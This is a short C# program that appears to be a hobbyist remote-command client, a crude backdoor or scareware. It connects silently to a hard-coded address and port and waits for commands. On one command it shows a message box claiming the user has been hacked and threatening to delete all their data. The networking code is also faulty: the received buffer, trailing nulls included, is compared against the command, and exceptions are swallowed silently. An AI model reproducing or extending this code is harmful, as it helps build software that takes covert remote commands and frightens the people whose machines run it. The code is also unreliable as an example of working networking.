using System;
using System.Net;
using System.Net.Sockets;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace serverdddddddw
{
    class Program
    {
        public static TcpClient client;
        public static int port = 3720;
        public static IPAddress ipadress = null;
        public static  string connectTo= "192.168.57.1";
        public static Thread getMessages = new Thread(readMessage);
        public static NetworkStream dataStream;
        static int getIndex(byte[] buffer)
        {
            int i = 0;
            for (; i < buffer.Length; i++)
            {
                if (buffer[i] == 0x00) { break; }


            }
            return i;
        }
        static void analyzeMessage(string msg)
        {
            
            if (msg== "disp msg")
            {
                MessageBox.Show("You have been hacked by genshiro-dtb! Check out my github or.... I will delete all your data", "Oi! Look here!", MessageBoxButtons.OK, MessageBoxIcon.Warning);

            }




        }

        static void readMessage()
        {

            string temp = "";
            while (true)
            {
                
                if(dataStream.DataAvailable==true)
                {

                    byte[] buffer = new byte[1048];
                    dataStream.Read(buffer, 0,buffer.Length);
                    int cutAt = getIndex(buffer);
                    for(int i=0; i<cutAt; i ++)
                    {
                        if( buffer[i]== 0x00) { }


                    }
                  
                    for (int i = 0; i < buffer.Length; i++)
                    {

                        temp  += (char)buffer[i];
                    }
                    analyzeMessage(temp);
                    temp = string.Empty;
                    dataStream.Flush();

                }
                

            }


        }


        static void Main(string[] args)
        {
            bool isValidIp = IPAddress.TryParse(connectTo, out ipadress);
           if (isValidIp == false) {  ipadress =       Dns.GetHostAddresses(connectTo)[0]; Console.WriteLine(Dns.GetHostAddresses(connectTo)[0]); }
            client = new TcpClient();
            try
            {
                do
                {

                    client.Connect((ipadress), port);
                    dataStream = client.GetStream();
                    getMessages.Start();
                } while (client.Connected != true);
            }
            catch (Exception ex) { }


            
        }
    }
}
